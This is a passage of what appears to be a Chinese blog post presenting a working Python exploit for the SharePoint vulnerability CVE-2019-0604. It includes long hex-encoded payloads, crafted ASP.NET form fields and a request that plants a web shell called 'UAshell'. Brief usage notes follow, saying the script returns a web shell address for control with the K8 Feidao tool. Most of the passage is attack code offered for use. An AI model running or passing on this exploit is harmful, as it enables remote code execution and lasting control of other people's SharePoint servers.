x36\x30\x30\x30\x37\x30\x30\x35\x36\x30\x30\x32\x37\x30\x30\x34\x37\x30\x30\x39\x37\x30\x30\x30\x33\x30\x30\x65\x33\x30\x30\x64\x30\x30\x30\x61\x30\x30\x30\x30\x32\x30\x30\x30\x32\x30\x30\x30\x32\x30\x30\x30\x32\x30\x30\x63\x33\x30\x30\x66\x34\x30\x30\x32\x36\x30\x30\x61\x36\x30\x30\x35\x36\x30\x30\x33\x36\x30\x30\x34\x37\x30\x30\x39\x34\x30\x30\x65\x36\x30\x30\x33\x37\x30\x30\x34\x37\x30\x30\x31\x36\x30\x30\x65\x36\x30\x30\x33\x36\x30\x30\x35\x36\x30\x30\x30\x32\x30\x30\x38\x37\x30\x30\x33\x37\x30\x30\x39\x36\x30\x30\x61\x33\x30\x30\x34\x37\x30\x30\x39\x37\x30\x30\x30\x37\x30\x30\x35\x36\x30\x30\x64\x33\x30\x30\x32\x32\x30\x30\x38\x35\x30\x30\x31\x36\x30\x30\x64\x36\x30\x30\x63\x36\x30\x30\x32\x35\x30\x30\x35\x36\x30\x30\x31\x36\x30\x30\x34\x36\x30\x30\x35\x36\x30\x30\x32\x37\x30\x30\x32\x32\x30\x30\x30\x32\x30\x30\x66\x32\x30\x30\x65\x33\x30\x30\x64\x30\x30\x30\x61\x30\x30\x30\x30\x32\x30\x30\x30\x32\x30\x30\x30\x32\x30\x30\x30\x32\x30\x30\x63\x33\x30\x30\x64\x34\x30\x30\x35\x36\x30\x30\x34\x37\x30\x30\x38\x36\x30\x30\x66\x36\x30\x30\x34\x36\x30\x30\x65\x34\x30\x30\x31\x36\x30\x30\x64\x36\x30\x30\x35\x36\x30\x30\x65\x33\x30\x30\x30\x35\x30\x30\x31\x36\x30\x30\x32\x37\x30\x30\x33\x37\x30\x30'
-payload3='\x61\x33\x30\x30\x33\x35\x30\x30\x39\x37\x30\x30\x33\x37\x30\x30\x34\x37\x30\x30\x35\x36\x30\x30\x64\x36\x30\x30\x62\x33\x30\x30\x31\x36\x30\x30\x33\x37\x30\x30\x33\x37\x30\x30\x35\x36\x30\x30\x64\x36\x30\x30\x32\x36\x30\x30\x63\x36\x30\x30\x39\x37\x30\x30\x64\x33\x30\x30\x64\x36\x30\x30\x33\x37\x30\x30\x33\x36\x30\x30\x66\x36\x30\x30\x32\x37\x30\x30\x63\x36\x30\x30\x39\x36\x30\x30\x32\x36\x30\x30\x32\x32\x30\x30\x64\x30\x30\x30\x61\x30\x30\x30\x38\x37\x30\x30\x64\x36\x30\x30\x63\x36\x30\x30\x65\x36\x30\x30\x33\x37\x30\x30\x61\x33\x30\x30\x34\x34\x30\x30\x39\x36\x30\x30\x31\x36\x30\x30\x37\x36\x30\x30\x64\x33\x30\x30\x32\x32\x30\x30\x33\x36\x30\x30\x63\x36\x30\x30\x32\x37\x30\x30\x64\x32\x30\x30\x65\x36\x30\x30\x31\x36\x30\x30\x64\x36\x30\x30\x35\x36\x30\x30\x33\x37\x30\x30\x30\x37\x30\x30\x31\x36\x30\x30\x33\x36\x30\x30\x35\x36\x30\x30\x61\x33\x30\x30\x33\x35\x30\x30\x39\x37\x30\x30\x33\x37\x30\x30\x34\x37\x30\x30\x35\x36\x30\x30\x64\x36\x30\x30\x65\x32\x30\x30\x34\x34\x30\x30\x39\x36\x30\x30\x31\x36\x30\x30\x37\x36\x30\x30\x65\x36\x30\x30\x66\x36\x30\x30\x33\x37\x30\x30\x34\x37\x30\x30\x39\x36\x30\x30\x33\x36\x30\x30\x33\x37\x30\x30\x62\x33\x30\x30\x31\x36\x30\x30\x33\x37\x30\x30\x33\x37\x30\x30\x35\x36\x30\x30\x64\x36\x30\x30\x32\x36\x30\x30\x63\x36\x30\x30\x39\x37\x30\x30\x64\x33\x30\x30\x33\x37\x30\x30\x39\x37\x30\x30\x33\x37\x30\x30\x34\x37\x30\x30\x35\x36\x30\x30\x64\x36\x30\x30\x32\x32\x30\x30\x36\x32\x30\x30\x37\x36\x30\x30\x34\x37\x30\x30\x62\x33\x30\x30\x64\x30\x30\x30\x61\x30\x30\x30\x39\x30\x30\x30\x36\x32\x30\x30\x63\x36\x30\x30\x34\x37\x30\x30\x62\x33\x30\x30\x66\x34\x30\x30\x32\x36\x30\x30\x61\x36\x30\x30\x35\x36\x30\x30\x33\x36\x30\x30\x34\x37\x30\x30\x34\x34\x30\x30\x31\x36\x30\x30\x34\x37\x30\x30\x31\x36\x30\x30\x30\x35\x30\x30\x32\x37\x30\x30\x66\x36\x30\x30\x36\x37\x30\x30\x39\x36\x30\x30\x34\x36\x30\x30\x35\x36\x30\x30\x32\x37\x30\x30\x30\x32\x30\x30\x38\x37\x30\x30\x61\x33\x30\x30\x62\x34\x30\x30\x35\x36\x30\x30\x39\x37\x30\x30\x64\x33\x30\x30\x32\x32\x30\x30\x63\x34\x30\x30\x31\x36\x30\x30\x35\x37\x30\x30\x65\x36\x30\x30\x33\x36\x30\x30\x38\x36\x30\x30\x33\x34\x30\x30\x31\x36\x30\x30\x63\x36\x30\x30\x33\x36\x30\x30\x38\x36\x30\x30\x32\x32\x30\x30\x30\x32\x30\x30\x66\x34\x30\x30\x32\x36\x30\x30\x61\x36\x30\x30\x35\x36\x30\x30\x33\x36\x30\x30\x34\x37\x30\x30\x34\x35\x30\x30\x39\x37\x30\x30\x30\x37\x30\x30\x35\x36\x30\x30\x64\x33\x30\x30\x32\x32\x30\x30\x62\x37\x30\x30\x38\x37\x30\x30\x61\x33\x30\x30\x34\x35\x30\x30\x39\x37\x30\x30\x30\x37\x30\x30\x35\x36\x30\x30\x30\x32\x30\x30\x34\x34\x30\x30\x39\x36\x30\x30\x31\x36\x30\x30\x37\x36\x30\x30\x61\x33\x30\x30\x30\x35\x30\x30\x32\x37\x30\x30\x66\x36\x30\x30\x33\x36\x30\x30\x35\x36\x30\x30\x33\x37\x30\x30\x33\x37\x30\x30\x64\x37\x30\x30\x32\x32\x30\x30\x30\x32\x30\x30\x64\x34\x30\x30\x35\x36\x30\x30\x34\x37\x30\x30\x38\x36\x30\x30\x66\x36\x30\x30\x34\x36\x30\x30\x65\x34\x30\x30\x31\x36\x30\x30\x64\x36\x30\x30\x35\x36\x30\x30\x64\x33\x30\x30\x32\x32\x30\x30\x33\x35\x30\x30\x34\x37\x30\x30\x31\x36\x30\x30\x32\x37\x30\x30\x34\x37\x30\x30\x32\x32\x30\x30\x36\x32\x30\x30\x37\x36\x30\x30\x34\x37\x30\x30\x62\x33\x30\x30\x64\x30\x30\x30\x61\x30\x30\x30\x39\x30\x30\x30\x39\x30\x30\x30\x36\x32\x30\x30\x63\x36\x30\x30\x34\x37\x30\x30\x62\x33\x30\x30\x66\x34\x30\x30\x32\x36\x30\x30\x61\x36\x30\x30\x35\x36\x30\x30\x33\x36\x30\x30\x34\x37\x30\x30\x34\x34\x30\x30\x31\x36\x30\x30\x34\x37\x30\x30\x31\x36\x30\x30\x30\x35\x30\x30\x32\x37\x30\x30\x66\x36\x30\x30\x36\x37\x30\x30\x39\x36\x30\x30\x34\x36\x30\x30\x35\x36\x30\x30\x32\x37\x30\x30\x65\x32\x30\x30\x64\x34\x30\x30\x35\x36\x30\x30\x34\x37\x30\x30\x38\x36\x30\x30\x66\x36\x30\x30\x34\x36\x30\x30\x30\x35\x30\x30\x31\x36\x30\x30\x32\x37\x30\x30\x31\x36\x30\x30\x64\x36\x30\x30\x35\x36\x30\x30\x34\x37\x30\x30\x35\x36\x30\x30\x32\x37\x30\x30\x33\x37\x30\x30\x36\x32\x30\x30\x37\x36\x30\x30\x34\x37\x30\x30\x62\x33\x30\x30\x64\x30\x30\x30\x61\x30\x30\x30\x39\x30\x30\x30\x39\x30\x30\x30\x39\x30\x30\x30\x36\x32\x30\x30\x63\x36\x30\x30\x34\x37\x30\x30\x62\x33\x30\x30\x33\x35\x30\x30\x39\x37\x30\x30\x33\x37\x30\x30\x34\x37\x30\x30\x35\x36\x30\x30\x64\x36\x30\x30\x61\x33\x30\x30\x33\x35\x30\x30\x34\x37\x30\x30\x32\x37\x30\x30\x39\x36\x30\x30\x65\x36\x30\x30\x37\x36\x30\x30\x36\x32\x30\x30\x37\x36\x30\x30\x34\x37\x30\x30\x62\x33\x30\x30\x33\x36\x30\x30\x64\x36\x30\x30\x34\x36\x30\x30\x36\x32\x30\x30\x63\x36\x30\x30\x34\x37\x30\x30\x62\x33\x30\x30\x66\x32\x30\x30\x33\x35\x30\x30\x39\x37\x30\x30\x33\x37\x30\x30\x34\x37\x30\x30\x35\x36\x30\x30\x64\x36\x30\x30\x61\x33\x30\x30\x33\x35\x30\x30\x34\x37\x30\x30\x32\x37\x30\x30\x39\x36\x30\x30\x65\x36\x30\x30\x37\x36\x30\x30\x36\x32\x30\x30\x37\x36\x30\x30\x34\x37\x30\x30\x62\x33\x30\x30\x64\x30\x30\x30\x61\x30\x30\x30\x39\x30\x30\x30\x39\x30\x30\x30\x39\x30\x30\x30\x36\x32\x30\x30\x63\x36\x30\x30\x34\x37\x30\x30\x62\x33\x30\x30\x33\x35\x30\x30\x39\x37\x30\x30\x33\x37\x30\x30\x34\x37\x30\x30\x35\x36\x30\x30\x64\x36\x30\x30\x61\x33\x30\x30\x33\x35\x30\x30\x34\x37\x30\x30\x32\x37\x30\x30\x39\x36\x30\x30\x65\x36\x30\x30\x37\x36\x30\x30\x36\x32\x30\x30\x37\x36\x30\x30\x34\x37\x30\x30\x62\x33\x30\x30\x66\x32\x30\x30\x33\x36\x30\x30\x30\x32\x30\x30\x35\x36\x30\x30\x33\x36\x30\x30\x38\x36\x30\x30\x66\x36\x30\x30\x30\x32\x30\x30\x65\x35\x30\x30\x36\x32\x30\x30\x31\x36\x30\x30\x64\x36\x30\x30\x30\x37\x30\x30\x62\x33\x30\x30\x63\x36\x30\x30\x34\x37\x30\x30\x62\x33\x30\x30\x35\x32\x30\x30\x30\x34\x30\x30\x30\x32\x30\x30\x30\x35\x30\x30\x31\x36\x30\x30\x37\x36\x30\x30\x35\x36\x30\x30\x30\x32\x30\x30\x63\x34\x30\x30\x31\x36\x30\x30\x65\x36\x30\x30\x37\x36\x30\x30\x35\x37\x30\x30\x31\x36\x30\x30\x37\x36\x30\x30\x35\x36\x30\x30\x64\x33\x30\x30\x32\x32\x30\x30\x61\x34\x30\x30\x33\x37\x30\x30\x33\x36\x30\x30\x32\x37\x30\x30\x39\x36\x30\x30\x30\x37\x30\x30\x34\x37\x30\x30\x32\x32\x30\x30\x30\x32\x30\x30\x35\x32\x30\x30\x65\x35\x30\x30\x36\x32\x30\x30\x37\x36\x30\x30\x34\x37\x30\x30\x62\x33\x30\x30\x65\x35\x30\x30\x36\x32\x30\x30\x31\x36\x30\x30\x64\x36\x30\x30\x30\x37\x30\x30\x62\x33\x30\x30\x63\x36\x30\x30\x34\x37\x30\x30\x62\x33\x30\x30\x35\x32\x30\x30\x36\x37\x30\x30\x31\x36\x30\x30\x32\x37\x30\x30\x30\x32\x30\x30\x30\x37\x30\x30\x37\x37\x30\x30\x34\x36\x30\x30\x64\x33\x30\x30\x32\x32\x30\x30\x34\x37\x30\x30\x66\x36\x30\x30\x64\x36\x30\x30\x32\x32\x30\x30\x62\x33\x30\x30\x36\x37\x30\x30\x31\x36\x30\x30\x32\x37\x30\x30\x30\x32\x30\x30\x35\x37\x30\x30\x31\x36\x30\x30\x33\x37\x30\x30\x34\x37\x30\x30\x32\x37\x30\x30\x64\x33\x30\x30\x32\x35\x30\x30\x35\x36\x30\x30\x31\x37\x30\x30\x35\x37\x30\x30\x35\x36\x30\x30\x33\x37\x30\x30\x34\x37\x30\x30\x65\x32\x30\x30\x35\x35\x30\x30\x33\x37\x30\x30\x35\x36\x30\x30\x32\x37\x30\x30\x31\x34\x30\x30\x37\x36\x30\x30\x35\x36\x30\x30\x65\x36\x30\x30\x34\x37\x30\x30\x62\x33\x30\x30\x39\x36\x30\x30\x36\x36\x30\x30\x30\x32\x30\x30\x38\x32\x30\x30\x35\x37\x30\x30\x31\x36\x30\x30\x33\x37\x30\x30\x34\x37\x30\x30\x32\x37\x30\x30\x65\x32\x30\x30\x33\x35\x30\x30\x35\x37\x30\x30\x32\x36\x30\x30\x33\x37\x30\x30\x34\x37\x30\x30\x32\x37\x30\x30\x39\x36\x30\x30\x65\x36\x30\x30\x37\x36\x30\x30\x38\x32\x30\x30\x30\x33\x30\x30\x63\x32\x30\x30\x30\x32\x30\x30\x35\x37\x30\x30\x31\x36\x30\x30\x33\x37\x30\x30\x34\x37\x30\x30\x32\x37\x30\x30\x65\x32\x30\x30\x39\x34\x30\x30\x65\x36\x30\x30\x34\x36\x30\x30\x35\x36\x30\x30\x38\x37\x30\x30\x66\x34\x30\x30\x36\x36\x30\x30\x38\x32\x30\x30\x32\x32\x30\x30\x64\x33\x30\x30\x64\x33\x30\x30\x64\x33\x30\x30\x32\x32\x30\x30\x39\x32\x30\x30\x39\x32\x30\x30\x64\x33\x30\x30\x64\x33\x30\x30\x30\x32\x30\x30\x30\x37\x30\x30\x37\x37\x30\x30\x34\x36\x30\x30\x39\x32\x30\x30\x30\x32\x30\x30\x62\x37\x30\x30\x36\x37\x30\x30\x31\x36\x30\x30\x32\x37\x30\x30\x30\x32\x30\x30\x33\x36\x30\x30\x66\x36\x30\x30\x34\x36\x30\x30\x35\x36\x30\x30\x64\x33\x30\x30\x35\x37\x30\x30\x31\x36\x30\x30\x33\x37\x30\x30\x34\x37\x30\x30\x32\x37\x30'
-payload4='\x74\x6F\x6D\x3D\x3D\x3D\x52\x65\x73\x70\x6F\x6E\x73\x65\x2E\x57\x72\x69\x74\x65\x28\x22\x55\x41\x73\x68\x65\x6C\x6C\x22\x29\x3B'
-payload5='\x23\x64\x61\x74\x65\x3A\x20\x32\x30\x31\x39\x30\x36\x32\x36\x20\x23\x61\x75\x74\x68\x6F\x72\x3A\x20\x6B\x38\x67\x65\x67\x65'
-
-<p>values = {‘<strong>REQUESTDIGEST’:’0xF4545A48FA093FD290D386F2E317C72EF439C05EABDC8BDF0D81022DAEFE10FF6D4782A17836870BB0EBF673E71DCD6F7E631A1371319881902FDEF3032A16F4,18 Jun 2019 16:41:35 -0000’,<br>‘</strong>EVENTTARGET’:’’,<br>‘<strong>EVENTARGUMENT’:’’,<br>‘</strong>spPickerHasReturnValue’:’’,<br>‘<strong>spPickerReturnValueHolder’:’’,<br>‘</strong>VIEWSTATE’:’/wEPDwULLTIwNTYyMzI3OTQPZBYCZg9kFgQCBQ9kFgICBQ9kFgJmD2QWAgIBD2QWAmYPFgIeBFRleHQFBlBpY2tlcmQCCQ9kFgICBw9kFgwCAw9kFgJmDxYEHgxFcnJvck1lc3NhZ2VlHgtIdG1sTWVzc2FnZQVpPHNwYW4gY2xhc3M9Im1zLWVycm9yIj5BbiBlcnJvciBvY2N1cnJlZC4gQWRtaW5pc3RyYXRvcnMsIHNlZSB0aGUgc2VydmVyIGxvZyBmb3IgbW9yZSBpbmZvcm1hdGlvbi48L3NwYW4+ZAIFD2QWAmYPZBYCZg9kFgJmD2QWAgIBD2QWAmYPDxYCHwBlFgIeCW9ua2V5ZG93bgW1AXZhciBlPWV2ZW50OyBpZighZSkgZT13aW5kb3cuZXZlbnQ7IGlmKCFicm93c2VyaXMuc2FmYXJpICYmIGUua2V5Q29kZT09MTMpIHsgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2N0bDAwX1BsYWNlSG9sZGVyRGlhbG9nQm9keVNlY3Rpb25fY3RsMDdfcXVlcnlCdXR0b24nKS5jbGljaygpOyByZXR1cm4gZmFsc2U7IH1kAgcPZBYCZg8PFgIfAAVpPHNwYW4gY2xhc3M9Im1zLWVycm9yIj5BbiBlcnJvciBvY2N1cnJlZC4gQWRtaW5pc3RyYXRvcnMsIHNlZSB0aGUgc2VydmVyIGxvZyBmb3IgbW9yZSBpbmZvcm1hdGlvbi48L3NwYW4+ZGQCCQ9kFgJmDw8WAh8AZWRkAgsPZBYCZg8PFgIeEkNPTFVNTkRJU1BMQVlOQU1FUxYAZGQCDQ9kFgICAQ9kFgQCAQ8WAh4FdmFsdWUFBkFkZCAtPmQCAw9kFgJmDw8WCh4OQ1VTVE9NUFJPUEVSVFllHgVXaWR0aBsAAAAAAABZQAcAAAAeCUlTQ0hBTkdFRGgeBF8hU0ICgAIeDEVuYWJsZUJyb3dzZWgWGB4OZWRpdG9yT2xkVmFsdWVlHgpSZW1vdmVUZXh0BQZSZW1vdmUfBWUeDU5vTWF0Y2hlc1RleHQFEU5vIE1hdGNoaW5nIEl0ZW1zHgphbGxvd0VtcHR5BQExHg1Nb3JlSXRlbXNUZXh0BQ1Nb3JlIEl0ZW1zLi4uHhhwcmVmZXJDb250ZW50RWRpdGFibGVEaXYFBHRydWUeHXNob3dEYXRhVmFsaWRhdGlvbkVycm9yQm9yZGVyBQVmYWxzZR4LYWxsb3dUeXBlSW4FBWZhbHNlHgppblZhbGlkYXRlBQVmYWxzZR4bRUVBZnRlckNhbGxiYWNrQ2xpZW50U2NyaXB0ZR4eU2hvd0VudGl0eURpc3BsYXlUZXh0SW5UZXh0Qm94BQEwFgICBA8PFgYfBxsAAAAAAABZQAcAAAAeCENzc0NsYXNzBQ1tcy11c2VyZWRpdG9yHwkCggJkFgRmDw8WBB4NVmVydGljYWxBbGlnbgsqJ1N5c3RlbS5XZWIuVUkuV2ViQ29udHJvbHMuVmVydGljYWxBbGlnbgMfCQKAgAhkFgJmD2QWAmYPZBYCZg9kFgJmD2QWBGYPFigeCHRhYmluZGV4BQEwHgdvbmZvY3VzBbEBU3RvcmVPbGRWYWx1ZSgnY3RsMDBfUGxhY2VIb2xkZXJEaWFsb2dCb2R5U2VjdGlvbl9jdGwwNScpOyBzYXZlT2xkRW50aXRpZXMoJ2N0bDAwX1BsYWNlSG9sZGVyRGlhbG9nQm9keVNlY3Rpb25fY3RsMDUnKTsgU3lzLlVJLkRvbUVsZW1lbnQuYWRkQ3NzQ2xhc3ModGhpcywgJ21zLWlucHV0Qm94QWN0aXZlJyk7Hg5hcmlhLW11bHRpbGluZQUEdHJ1ZR4Gb25ibHVyBYEDaWYodHlwZW9mKEV4dGVybmFsQ3VzdG9tQ29udHJvbENhbGxiYWNrKT09J2Z1bmN0aW9uJyl7IGlmKFNob3VsZENhbGxDdXN0b21DYWxsQmFjaygnY3RsMDBfUGxhY2VIb2xkZXJEaWFsb2dCb2R5U2VjdGlvbl9jdGwwNScsZXZlbnQpKXtpZighVmFsaWRhdGVQaWNrZXJDb250cm9sKCdjdGwwMF9QbGFjZUhvbGRlckRpYWxvZ0JvZHlTZWN0aW9uX2N0bDA1Jykpe1Nob3dWYWxpZGF0aW9uRXJyb3IoKTtyZXR1cm4gZmFsc2U7fWVsc2Uge0V4dGVybmFsQ3VzdG9tQ29udHJvbENhbGxiYWNrKCdjdGwwMF9QbGFjZUhvbGRlckRpYWxvZ0JvZHlTZWN0aW9uX2N0bDA1Jyk7fX19IFN5cy5VSS5Eb21FbGVtZW50LnJlbW92ZUNzc0NsYXNzKHRoaXMsICdtcy1pbnB1dEJveEFjdGl2ZScpOx4Hb25jbGljawVHb25DbGlja1J3KHRydWUsIHRydWUsZXZlbnQsJ2N0bDAwX1BsYWNlSG9sZGVyRGlhbG9nQm9keVNlY3Rpb25fY3RsMDUnKTseCG9uY2hhbmdlBT91cGRhdGVDb250cm9sVmFsdWUoJ2N0bDAwX1BsYWNlSG9sZGVyRGlhbG9nQm9keVNlY3Rpb25fY3RsMDUnKTseB29uUGFzdGUFOmRvcGFzdGUoJ2N0bDAwX1BsYWNlSG9sZGVyRGlhbG9nQm9keVNlY3Rpb25fY3RsMDUnLGV2ZW50KTsfEAUEdHJ1ZR4MQXV0b1Bvc3RCYWNrBQEwHgRyb3dzBQExHgtvbkRyYWdTdGFydAUOY2FuRXZ0KGV2ZW50KTseB29ua2V5dXAFPXJldHVybiBvbktleVVwUncoJ2N0bDAwX1BsYWNlSG9sZGVyRGlhbG9nQm9keVNlY3Rpb25fY3RsMDUnKTseBm9uQ29weQU5ZG9jb3B5KCdjdGwwMF9QbGFjZUhvbGRlckRpYWxvZ0JvZHlTZWN0aW9uX2N0bDA1JyxldmVudCk7HgV0aXRsZQUURXh0ZXJuYWwgSXRlbSBQaWNrZXIfAwVQcmV0dXJuIG9uS2V5RG93blJ3KCdjdGwwMF9QbGFjZUhvbGRlckRpYWxvZ0JvZHlTZWN0aW9uX2N0bDA1JywgMywgZmFsc2UsIGV2ZW50KTseCnNwZWxsY2hlY2sFBWZhbHNlHg9jb250ZW50RWRpdGFibGUFBHRydWUeDWFyaWEtaGFzcG9wdXAFBHRydWUeBXN0eWxlBTp3b3JkLXdyYXA6IGJyZWFrLXdvcmQ7b3ZlcmZsb3cteDogaGlkZGVuO292ZXJmbG93LXk6IGF1dG87HgRyb2xlBQd0ZXh0Ym94ZAIBDw8WCh4IVGFiSW5kZXgBAAAfBxsAAAAAAABZQAcAAAAeBFJvd3MCAR8faB8JAoACFhIfGQWxAVN0b3JlT2xkVmFsdWUoJ2N0bDAwX1BsYWNlSG9sZGVyRGlhbG9nQm9keVNlY3Rpb25fY3RsMDUnKTsgc2F2ZU9sZEVudGl0aWVzKCdjdGwwMF9QbGFjZUhvbGRlckRpYWxvZ0JvZHlTZWN0aW9uX2N0bDA1Jyk7IFN5cy5VSS5Eb21FbGVtZW50LmFkZENzc0NsYXNzKHRoaXMsICdtcy1pbnB1dEJveEFjdGl2ZScpOx8iBT1yZXR1cm4gb25LZXlVcFJ3KCdjdGwwMF9QbGFjZUhvbGRlckRpYWxvZ0JvZHlTZWN0aW9uX2N0bDA1Jyk7HyQFFEV4dGVybmFsIEl0ZW0gUGlja2VyHx0FP3VwZGF0ZUNvbnRyb2xWYWx1ZSgnY3RsMDBfUGxhY2VIb2xkZXJEaWFsb2dCb2R5U2VjdGlvbl9jdGwwNScpOx8bBYEDaWYodHlwZW9mKEV4dGVybmFsQ3VzdG9tQ29udHJvbENhbGxiYWNrKT09J2Z1bmN0aW9uJyl7IGlmKFNob3VsZENhbGxDdXN0b21DYWxsQmFjaygnY3RsMDBfUGxhY2VIb2xkZXJEaWFsb2dCb2R5U2VjdGlvbl9jdGwwNScsZXZlbnQpKXtpZighVmFsaWRhdGVQaWNrZXJDb250cm9sKCdjdGwwMF9QbGFjZUhvbGRlckRpYWxvZ0JvZHlTZWN0aW9uX2N0bDA1Jykpe1Nob3dWYWxpZGF0aW9uRXJyb3IoKTtyZXR1cm4gZmFsc2U7fWVsc2Uge0V4dGVybmFsQ3VzdG9tQ29udHJvbENhbGxiYWNrKCdjdGwwMF9QbGFjZUhvbGRlckRpYWxvZ0JvZHlTZWN0aW9uX2N0bDA1Jyk7fX19IFN5cy5VSS5Eb21FbGVtZW50LnJlbW92ZUNzc0NsYXNzKHRoaXMsICdtcy1pbnB1dEJveEFjdGl2ZScpOx8oBSJkaXNwbGF5OiBub25lO3Bvc2l0aW9uOiBhYnNvbHV0ZTsgHwMFUHJldHVybiBvbktleURvd25SdygnY3RsMDBfUGxhY2VIb2xkZXJEaWFsb2dCb2R5U2VjdGlvbl9jdGwwNScsIDMsIGZhbHNlLCBldmVudCk7Hx8FATAeGnJlbmRlckFzQ29udGVudEVkaXRhYmxlRGl2BQR0cnVlZAICDw8WAh4HVmlzaWJsZWhkZBgBBR5fX0NvbnRyb2xzUmVxdWlyZVBvc3RCYWNrS2V5X18WAgU0Y3RsMDAkUGxhY2VIb2xkZXJEaWFsb2dCb2R5U2VjdGlvbiRjdGwwNyRxdWVyeUJ1dHRvbgUoY3RsMDAkUGxhY2VIb2xkZXJEaWFsb2dCb2R5U2VjdGlvbiRjdGwwNVdO0+ZP+kKR1gMQud0zVHpuy8sqq7e4YSOgfg1USdFj’,<br>‘<strong>VIEWSTATEGENERATOR’:’A123E449’,<br>ct1+paySection+’$ctl07$queryTextBox’:’’,<br>paySpanData:payload1+’4700440016004700160005002700f60067009600460056002700c200020005002700560037005600e6004700160047009600f600e600640027001600d60056007700f6002700b600c200020065005600270037009600f600e600d3004300e2000300e2000300e2000300c200020034005700c6004700570027005600d300e60056005700470027001600c600c2000200050057002600c60096003600b400560097004500f600b6005600e600d3003300130026006600330083005300630016004600330063004300560033005300d500d500c200020035009700370047005600d600e2004400160047001600e20035005600270067009600360056003700c200020065005600270037009600f600e600d3004300e2000300e2000300e2000300c200020034005700c6004700570027005600d300e60056005700470027001600c600c2000200050057002600c60096003600b400560097004500f600b6005600e600d3002600730073001600530036005300630013009300330043005600030083009300a300c300f300’+payload2+’5600c300f200d400560047008600f6004600e4001600d6005600e300d000a0000200020002000200c300d400560047008600f60046000500160027001600d60056004700560027003700e300d000a000020002000200020002000200c3001600e600970045009700070056000200870037009600a3004700970007005600d3002200870037004600a3003700470027009600e60076002200e3006200c6004700b300250056003700f600570027003600560044009600360047009600f600e600160027009700d000a0008700d600c600e6003700d30022008600470047000700a300f200f2003700360086005600d60016003700e200d600960036002700f6003700f60066004700e2003600f600d600f20077009600e60066008700f2002300030003006300f20087001600d600c600f20007002700560037005600e6004700160047009600f600e6002200d000a0008700d600c600e6003700a3008700d30022008600470047000700a300f200f2003700360086005600d60016003700e200d600960036002700f6003700f60066004700e2003600f600d600f20077009600e60066008700f2002300030003006300f20087001600d600c6002200d000a0008700d600c600e6003700a30035009700370047005600d600d30022003600c6002700d200e6001600d600560037000700160036005600’+payload3+’0e200250056000700c6001600360056008200070077004600b2002200d300d300d3002200c200220022009200b300560067001600c60082003600f60046005600c20022005700e600370016006600560022009200b3000200d700b3005200e500620076004700b3000200620076004700b3000200220052003400f600d600d600f600e60005002700f600760027001600d60064009600c600560037005200c500d400960036002700f6003700f600660047000200350086001600270056004600c500750056002600020035005600270067005600270002005400870047005600e60037009600f600e6003700c50013005300c50045005400d4000500c400140045005400c500c40014009500f400550045003500c50057001600e2001600370007008700220002006200c6004700b300f20035009700370047005600d600a3003500470027009600e6007600620076004700b300d000a000900090006200c6004700b300f200f4002600a600560036004700440016004700160005002700f60067009600460056002700e200d400560047008600f60046000500160027001600d60056004700560027003700620076004700b300d000a00090006200c6004700b300f200f4002600a600560036004700440016004700160005002700f60067009600460056002700620076004700b300d000a0006200c6004700b300f200250056003700f600570027003600560044009600360047009600f600e600160027009700620076004700b300d000a000c300f2001600e60097004500970007005600e300d000a0000200020002000200c300f200d400560047008600f60046000500160027001600d60056004700560027003700e300d000a00002000200c300f20005002700f600a6005600360047005600460005002700f600070056002700470097000300e300d000a000c300f2005400870007001600e6004600560046007500270016000700070056002700f400660085001600d600c600250056001600460056002700f4002600a600560036004700440016004700160005002700f60067009600460056002700e300’,<br>ct1+paySection+ct2+’$OriginalEntities’:’&lt;Entities /&gt;’,<br>ct1+paySection+ct2+’$HiddenEntityKey’:’’,<br>ct1+paySection+ct2+’$HiddenEntityDisplayText’:’’,<br>ct1+paySection+ct2+’$downlevelTextBox’:’&nbsp;’,<br>‘</strong>CALLBACKID’:ct1+paySection+’$ctl07’,<br>‘<strong>CALLBACKPARAM’:’;#;#11;#;#;#’,<br>‘</strong>EVENTVALIDATION’:’/wEdAArGxMN0ZJ7K9w5zktdyYEhBD0ElpjQ1qya+g3gJn5tj2kGdpzwPwReE9qIrxAfsdm2iW+aWbiEcyxsYaScsTlQ450VsGNyXdI9EVzK0gDisZ5XfOLdqAfYHRFskSc14VkFc8gJL9PF80m6F3xAWwiF2sOBSyZzTvibJdZIQ6/yiluhmzA7nAUttaM/XaeAk14GgLvO2vw2Ax/oUZshBCs1rvRIjfjnjQxx1nrwDNJpAlG8icRe2xKLDvCGTmWjcu2A=’}</p>
-<p>data = urllib.urlencode(values)<br>req = urllib2.Request(url+spver, data)<br>response = urllib2.urlopen(req)<br>the_page = response.read()<br>print exp+’\n’+payload5<br>print the_page</p>
-<p>headers = {<br>    “Accept”: “text/html,application/xhtml+xml,application/xml;q=0.9,<a href="https://www.cnblogs.com/k8gege" target="_blank">image</a>/webp,image/apng,<em>/</em>;q=0.8”,<br>    “Accept-Language”: “en”,<br>    “Cache-Control”: “max-age=0”,<br>    “Connection”: “keep-alive”,<br>    “Cookie”: “PHPSESSID=m2hbrvp548cg6v4ssp0l35kcj7; _ga=GA1.2.2052701472.1532920469; _gid=GA1.2.1351314954.1532920469; __atuvc=3%7C31; __atuvs=5b5e9a0418f6420c001”,<br>    #”User-Agent”: “Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36”,<br>    “Upgrade-Insecure-Requests”: “1”,<br>    uapay: payload4,<br>    }</p>
-<p>data = {“<strong>CALLBACKID”: “”,<br>        “</strong>VIEWSTATE”: “”,<br>        ‘ctl00$’+paySection+’$’: “”,<br>        “<strong>CALLBACKID”: “All”,<br>        “</strong>CALLBACKPARAM”: “”}</p>
-<p>response = requests.get(shellurl, headers=headers, timeout=5)<br>if response.content==’UAshell’:<br>    print ‘UAshell: ‘+shellurl<br></p></pre><p></p>
-</div>
-<p>&nbsp;</p>
-<p><span style="font-size: 18px;"><strong>实战:</strong></span></p>
-<p><span style="font-size: 16px;">python cve-2019-0604-exp.py&nbsp;http://<a href="http://k8gege.github.io" target="_blank">k8gege.github.io</a></span></p>
-<p><span style="font-size: 16px;">若成功返回WebShell地址</span></p>
-<p><img alt data-original="http://k8gege.org/k8img/posts/CVE-2019-0604_1.png"></p>
-<p><span style="font-size: 16px;">UAshell访问报错，大家不要慌，原本设计就是这样子</span></p>
-<p><img alt data-original="http://k8gege.org/k8img/posts/CVE-2019-0604_2.png"></p>
-<p><span style="font-size: 16px;">使用K8飞刀CMD连接，当然你可以通过CMD下载其它的WebShell过去管理</span></p>
